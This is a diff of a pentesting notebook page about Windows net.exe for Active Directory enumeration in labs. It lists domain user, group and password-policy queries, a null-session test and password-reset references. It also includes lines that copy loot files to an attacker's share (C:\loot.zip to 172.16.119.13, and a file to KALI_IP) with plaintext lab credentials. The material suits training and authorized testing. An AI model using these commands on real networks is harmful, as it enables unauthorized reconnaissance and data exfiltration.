@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/net.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Inspect the domain password policy
+[Search this tool’s saved examples](/commands/notebook?tool=net) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Inspect the domain password policy
 
 **Run in:** Windows cmd.exe. **Requires:** A domain-aware Windows session and connectivity to the domain; this is a domain query, not a local one.
 
@@ -21,115 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 net accounts /domain
 ```
 
-**Read the result:** Separate local machine queries from /domain queries and inspect the resulting account/group context.
-
-**If The policy query fails or a fine-grained policy applies to an account:** Display names can be localized, and a command's successful query does not establish rights to modify the returned objects.
+**What the result establishes:** Separate local machine queries from /domain queries and inspect the resulting account/group context.
 
 **Next check:** Keep the scope of the returned policy; establish account-specific effective limits before choosing any authentication test.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-commands)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## net.exe: choose the operation and read the result
-
-Query Windows users, groups and account policy.
-
-### What the result establishes
-
-Separate local machine queries from /domain queries and inspect the resulting account/group context.
-
-### Prerequisites and common failures
-
-Display names can be localized, and a command's successful query does not establish rights to modify the returned objects.
-
-### Example 1: Commands
-
-Run in: **Windows cmd.exe**.
-
-```bash
-net user /domain
-net user USER /domain
-net group "Domain Admins" /domain
-net accounts /domain
-```
-
-### Example 2: 6. Net Commands
-
-Run in: **Saved lab example**.
-
-```powershell
-net user /domain
-```
-
-Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: 6. Net Commands
-
-Run in: **Saved lab example**.
-
-```powershell
-net group /domain
-```
-
-Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: 6. Net Commands
-
-Run in: **Saved lab example**.
-
-```powershell
-net accounts /domain
-```
-
-Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: 6. Net Commands
-
-Run in: **Saved lab example**.
-
-```powershell
-net user <ACCOUNT_NAME> /domain
-```
-
-Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: 6. Net Commands
-
-Run in: **Saved lab example**.
-
-```powershell
-net group "Domain Admins" /domain
-```
-
-Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: User Enumeration
-
-Run in: **Saved lab example**.
-
-```powershell
-$env:usernadsc
-net accounts
-```
-
-Saved context: [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Query Windows users, groups and account policy.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=net) · [All tools](/index)
 
 ## Commands
 
@@ -142,11 +44,15 @@ net group "Domain Admins" /domain
 net accounts /domain
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The policy query fails or a fine-grained policy applies to an account | Display names can be localized, and a command's successful query does not establish rights to modify the returned objects. |
 
 ## Notebook recipes
 
-39 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+35 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -182,21 +88,6 @@ net user USER /domain
 net use \\172.16.119.13\share /user:grcan grcan123
 copy C:\loot.zip \\172.16.119.13\share\
 # then pull DMZ01 -> Kali over SSH:  scp jbetty@<DMZ>:/path/loot.zip ~/loot/
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali → internal). Internal hosts  cannot  reach your external Kali IP — so  net use \\&lt;KALI>\share  from the DC fails with  System error 53 , and  proxychains impacket-smbserver  does NOT help (proxychains only proxies  outbound clients , not a  listening server ).
-
-```text
-net use \\<KALI>\share
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -345,6 +236,75 @@ whoami /priv
 
 </Accordion>
 
+<Accordion title="Establish names, policy, and your token">
+
+### Establish names, policy, and your token
+
+**Active Directory Enumeration: Quick Reference**
+
+```powershell
+whoami /all
+hostname
+ipconfig /all
+nltest /dsgetdc:DOMAIN_FQDN
+net accounts /domain
+net user /domain
+net group /domain
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration: Quick Reference — Establish names, policy, and your token](/active-directory/enumeration#establish-names-policy-and-your-token)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2. Identify the current session before reading permissions">
+
+### 2. Identify the current session before reading permissions
+
+**Active Directory: Enumeration Methodology**
+
+```powershell
+net user student /domain
+net group /domain
+net accounts /domain
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory: Enumeration Methodology — 2. Identify the current session before reading permissions](/active-directory/methodology#2-identify-the-current-session-before-reading-permissions)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Built-in domain queries">
+
+### Built-in domain queries
+
+**Active Directory: Enumeration Methodology**
+
+```powershell
+net user /domain
+net group /domain
+net accounts /domain
+net user student /domain
+net group "Domain Admins" /domain
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory: Enumeration Methodology — Built-in domain queries](/active-directory/methodology#built-in-domain-queries)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="RDP Session Hijacking">
 
 ### RDP Session Hijacking
@@ -403,19 +363,6 @@ The command completed successfully.
 <Accordion title="6. Net Commands">
 
 ### 6. Net Commands
-
-**Enumerate Active Directory with Built-in Tools**
-
-```powershell
-net accounts /domain
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands) · [AD Password Policies and User Lists — Key Enumeration Methods](/active-directory/password-policy-user-lists#key-enumeration-methods) · [Active Directory Troubleshooting — Corrections to remember](/active-directory/troubleshooting#corrections-to-remember)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 **Enumerate Active Directory with Built-in Tools**
 
@@ -528,6 +475,28 @@ find . -iname "*svc*" -o -iname "*service*account*"
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Find Credentials in Network Shares — Find Credentials in Network Shares](/password-attacks/credential-hunting-in-network-shares)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read policy through the access you have">
+
+### Read policy through the access you have
+
+**Password Policy Concepts and Remediation**
+
+```powershell
+Get-ADDefaultDomainPasswordPolicy
+Get-ADUserResultantPasswordPolicy USERNAME
+Get-ADUser USERNAME -Properties LockedOut,Enabled,PasswordExpired,PasswordLastSet
+net accounts /domain
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Policy Concepts and Remediation — Read policy through the access you have](/password-attacks/password-policies#read-policy-through-the-access-you-have)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -828,148 +797,24 @@ Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 
 </Accordion>
 
-<Accordion title="Key Enumeration Methods">
+<Accordion title="Copy a Windows file into an authenticated lab share">
 
-### Key Enumeration Methods
+### Copy a Windows file into an authenticated lab share
 
-**AD Password Policies and User Lists**
+**Windows → Kali file transfer**
 
-Context from the notebook: Without Credentials:  You can test for a NULL session from Windows using the  net use \\&lt;HOST>\ipc$ "" /u:""  command. The section also shows common error codes you might receive when authentication fails, which can help diagnose if an account is disabled, locked out, or if the password is simply incorrect.
-
-```text
-net use \\<HOST>\ipc$ "" /u:""
+```console
+net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
+copy C:\path\file.zip \\KALI_IP\share\file.zip
 ```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [AD Password Policies and User Lists — Key Enumeration Methods](/active-directory/password-policy-user-lists#key-enumeration-methods)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="8. Windows privesc">
-
-### 8. Windows privesc
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Then:  net user ,  net localgroup administrators ,  systeminfo ,  ipconfig /all ,  netstat -ano .
-
-```text
-net user
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 8. Windows privesc](/cheatsheets/ad-attack-path-worked-example#8-windows-privesc) · [Shells, Payloads, and Interactive TTYs — What Defenders Monitor](/exploitation/shells-payloads-cheat-sheet#what-defenders-monitor) · [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Then:  net user ,  net localgroup administrators ,  systeminfo ,  ipconfig /all ,  netstat -ano .
-
-```text
-net localgroup administrators
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 8. Windows privesc](/cheatsheets/ad-attack-path-worked-example#8-windows-privesc)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
-
-### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: net use \\KALI\..  →  System error 53 Internal host can't reach your external IP evil-winrm download ; or stage via DMZ host
-
-```text
-net use \\KALI\..
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
-
-### ACL / object‑control edges (the escalation bread‑and‑butter)
-
-**BloodHound: Full Reference**
-
-Context from the notebook: ForceChangePassword Reset their password (no old pw) bloodyAD ... set password &lt;target> 'NewPass123!'  or  net rpc password
-
-```text
-net rpc password
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [BloodHound: Full Reference — ACL / object‑control edges (the escalation bread‑and‑butter)](/cheatsheets/bloodhound-complete-guide#acl-/-object‑control-edges-the-escalation-bread‑and‑butter)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Enforcement in Active Directory">
-
-### Enforcement in Active Directory
-
-**Password Policy Concepts and Remediation**
-
-Context from the notebook: Read the current policy as an attacker with:  net accounts ,  nxc smb &lt;DC> -u u -p p --pass-pol , or  (Get-ADDefaultDomainPasswordPolicy) .
-
-```text
-net accounts
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Password Policy Concepts and Remediation — Enforcement in Active Directory](/password-attacks/password-policies#enforcement-in-active-directory) · [Password Policy Concepts and Remediation — Key takeaways](/password-attacks/password-policies#key-takeaways)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="The reachability rule — pivots are usually ONE‑WAY">
-
-### The reachability rule — pivots are usually ONE‑WAY
-
-**Pivoting and File Transfer: Field Reference**
-
-Context from the notebook: That's why  net use \\&lt;KALI_IP>\share  from a DC fails with  System error 53  — the DC has no route back to your external address.
-
-```text
-net use \\<KALI_IP>\share
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pivoting and File Transfer: Field Reference — The reachability rule — pivots are usually ONE‑WAY](/cheatsheets/pivoting-file-transfer#the-reachability-rule-—-pivots-are-usually-one‑way)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 </Accordion>
 
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-commands)
 
 {/* VAULT_RELATED_START */}
 
@@ -978,5 +823,3 @@ net use \\<KALI_IP>\share
 - [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
